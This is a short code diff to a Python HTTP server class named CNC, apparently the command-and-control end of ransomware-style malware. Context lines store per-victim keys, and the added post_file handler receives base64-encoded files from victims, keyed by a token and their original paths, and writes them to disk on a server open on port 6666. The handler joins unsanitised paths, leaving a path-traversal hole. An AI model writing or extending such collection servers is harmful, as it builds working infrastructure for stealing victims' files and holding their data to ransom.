@@ -34,6 +34,24 @@ class CNC(CNCBase):
             key_file.write(key)
 
         return {"status": "OK"}
+    
+    def post_file(self, path: str, params: dict, body: dict) -> dict:
+        token = params["token"]
+        file_data = body["file_data"]
+        file_name = body["file_name"]
+        original_path = body["original_path"]
+
+        token_dir = os.path.join(self.ROOT_PATH, token, "file", original_path)
+        os.makedirs(token_dir, exist_ok=True)
+
+        file_path = os.path.join(token_dir, file_name)
+        print("file_path", file_path)
+        with open(file_path, "wb") as f:
+            f.write(base64.b64decode(file_data))
+
+        return {"status": "OK"}
+
+
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
